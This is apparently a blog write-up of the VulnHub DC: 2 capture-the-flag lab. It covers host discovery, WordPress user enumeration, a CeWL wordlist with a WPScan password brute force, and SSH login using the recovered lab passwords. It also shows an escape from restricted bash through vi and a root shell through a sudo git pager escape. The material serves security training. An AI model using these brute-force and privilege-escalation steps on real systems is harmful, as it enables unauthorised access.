# VulnHub - DC: 2 (In Detail)

_10 min read · February 6, 2026 · by muhdsyahirk_

---

## Entry Log

In this mini-blog, I will share my detailed walkthrough of solving [**DC: 2**](https://www.vulnhub.com/entry/dc-2,311/) machine form [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: Final Flag (Root)
- Difficulty: Easy
- Machine Author: DCAU7

---

## Getting the Machine IP Address

As usual, I used [**Netdiscover**](https://www.kali.org/tools/netdiscover/) to identify the DC-2 IP address.

```bash
sudo netdiscover -i eth0 -r 192.168.11.0/24
```

![Netdiscover Output](./img/vulnhub-dc2/Netdiscover-output.png)

In my case, DC-2 IP address is **192.168.11.141**.

## Scanning the Open Ports

Next I scanned the machine using [**Nmap**](https://www.kali.org/tools/nmap/).

```bash
sudo nmap -p- -sCV 192.168.11.141
```

- -p- → Scan all ports.
- -sC → Run default scripts.
- -sV → Service version detection.

![Nmap Output](./img/vulnhub-dc2/Nmap-output.png)

From the scan results, I noticed HTTP service and SSH running on a non-standard port.

---

## Flag 1

Since HTTP was running, I opened it in the browser.

![DC: 2 Website Error](./img/vulnhub-dc2/DC2-site-error.png)

The page did not load properly using DC-2 IP address. This suggests that the web server uses **virtual hosting**, meaning it expects a specific domain name instead of direct IP access.

So I added the domain into /etc/hosts.

```bash
sudo nano /etc/hosts
```

![/etc/hosts](./img/vulnhub-dc2/etc-hosts.png)

After that, the site loaded properly. I noticed the website is running WordPress, and after playing around with it, I found the **first flag**.

![Flag 1](./img/vulnhub-dc2/flag1.png)

This flag means that we need to use CeWL to generate a custom password wordlist since it’s stated there “Your usual wordlists probably won’t work”.

---

## Flag 2

To gather more information about the site, I used [**Nikto**](https://www.kali.org/tools/nikto/).

```bash
nikto --host http://dc-2
```

![Nikto Output](./img/vulnhub-dc2/Nikto-output.png)

I found the login page: dc-2/wp-login.php.

I also used [**WPScan**](https://github.com/wpscanteam/wpscan).

```bash
wpscan --url http://dc-2 -e u
```

- -e u → Scan the users.

![WPScan Output](./img/vulnhub-dc2/WPScan-output.png)

I saved these usernames (admin, jerry and tom) into user.txt.

Since the flag hinted that common wordlists might not work, I generated a custom wordlist using [**CeWL**](https://www.kali.org/tools/cewl/).

```bash
cewl http://dc-2 > wordlist.txt
```

- cewl → Web crawler that extracts words from website content.
- http:// → Target site to crawl (extract all the words here).
- wordlist.txt → Save it in wordlist .txt.

![CeWL Output](./img/vulnhub-dc2/cewl-output.png)

Then I used WPScan to brute force finding the matching passwords (wordlist.txt) for the users (user.txt).

```bash
wpscan --url http://dc-2 -U 'user.txt' -P 'wordlist.txt'
```

- -U → Username list.
- -P → Password list.

![WPScan Brute Force Results](./img/vulnhub-dc2/WPScan-bf.png)

Credentials discovered.

Then I logged in as Jerry.

![DC: 2 Website Login](./img/vulnhub-dc2/DC2-login.png)

After exploring the site, I found the **second flag**.

![Jerry Dashboard](./img/vulnhub-dc2/Jerry-dashb.png)

The content:

![Flag 2](./img/vulnhub-dc2/flag2.png)

This flag means that WordPress exploitation is not the intended path and another entry point exists. Since SSH was discovered earlier on a non-standard port, this tells us to use SSH.

---

## Flag 3

I tried SSH login.

Jerry failed but Tom worked.

```bash
ssh tom@192.168.11.141 -p 7744
parturient
```

![Tom SSH](./img/vulnhub-dc2/Tom-ssh.png)

After logging in, I saw flag3.txt, but I couldn’t run normal commands (cat).

```bash
cat flag3.txt
```

Output:

```bash
-rbash: cat: command not found
```

The error message showed -rbash, which means that Tom is using a restricted bash shell. Restricted bash limits the commands that can be executed and often confines users to a limited set of binaries.

Then I checked the PATH variable:

```bash
echo $PATH
```

Output:

```bash
/home/tom/usr/bin
```

I discovered that only /home/tom/usr/bin was available for executing commands.

Then I ls that directory.

![ls usr/bin](./img/vulnhub-dc2/ls-usr-bin.png)

As shown here, only four allowed programs (less, ls, scp, and vi). This confirmed that the environment was intentionally restricted.

I then displayed the **third flag** using less.

```bash
less flag3.txt
```

![Flag 3](./img/vulnhub-dc2/flag3.png)

This flag means that we need to change user (using su) to Jerry.

---

## Flag 4 - Shell Escape

I tried to change user, but failed (as explained above).

```bash
su jerry
```

Output:

```bash
-rbash: su: command not found
```

As stated earlier, vi is allowed. vi is a text editor, but it can execute external commands and even spawn a shell, so I used vi to escape the restricted environment (-rbash).

Note: Many interactive programs such as text editor, pagers or scripting tools allow shell access.

First, I opened vi:

```bash
vi
```

Then Inside vi, I executed:

```bash
:set shell=/bin/bash <enter>
```

- :set shell= → Defines which shell vi should spawn.
- /bin/bash → The shell.

![vi 1](./img/vulnhub-dc2/vi-1.png)

This sets the shell that vi will use when spawning a command shell.

Then I executed:

```bash
:shell
```

- :shell → Opens that shell.

![vi 2](./img/vulnhub-dc2/vi-2.png)

This gave me a normal bash shell.

I then restored command access:

```bash
export PATH=$PATH:/bin:/sbin
```

This adds standard command directories back into PATH.

And changed to Jerry:

```bash
su jerry
adipiscing
```

Then simply navigate to Jerry directory and list the files there:

```bash
cd
ls
```

And I found the **fourth flag**.

![Flag 4](./img/vulnhub-dc2/flag4.png)

“you’re not home yet” this strongly means that root is the ‘ultimate’ home and “git outta here” means that I need to use git.

---

## Final Flag

Firstly, I checked sudo permissions on Jerry.

```bash
sudo -l
```

Output:

![Jerry sudo Permission](./img/vulnhub-dc2/Jerry-sudo.png)

This shows that Jerry can run git as root.

```bash
sudo git -p help config
```

- -p → Force pager mode (ensure less is launched).
- help → Opens a pager.
- config → It can be anything valid (config, log, commit, etc).

Inside pager:

```bash
!/bin/bash
```

- ! → Executes system command.
- /bin/bash → Spawn shell.
- Since git ran with sudo → shell is root.

Now I’m root.

![Jerry Root](./img/vulnhub-dc2/Jerry-root.png)

Then I cd and list the files there.

```bash
cd
ls
```

Then I found the **final flag**.

```bash
cat final-flag.txt
```

![Final Flag](./img/vulnhub-dc2/finalflag.png)

Bomba! Settleee.

---

## Session Terminated

DC-2 is another good beginner-to-intermediate level lab that focuses more on enumeration, logical thinking, and understanding restricted Linux environments rather than relying purely on exploits. Throughout this machine, I learned how to:

- identify virtual hosting issues and configure `/etc/hosts`
- perform WordPress enumeration using WPScan
- generate custom password wordlists using CeWL
- recognise and analyse restricted Bash environments (-rbash)
- understand the PATH variable and how command execution works in Linux
- perform shell escape using allowed programs such as `vi`
- enumerate sudo permissions using `sudo -l`
- perform privilege escalation through misconfigured sudo access (git pager escape)

Overall, this was a very educational lab that helped strengthen my understanding of enumeration, restricted shell environments, and Linux privilege escalation techniques. Thank you for reading and see you next time.
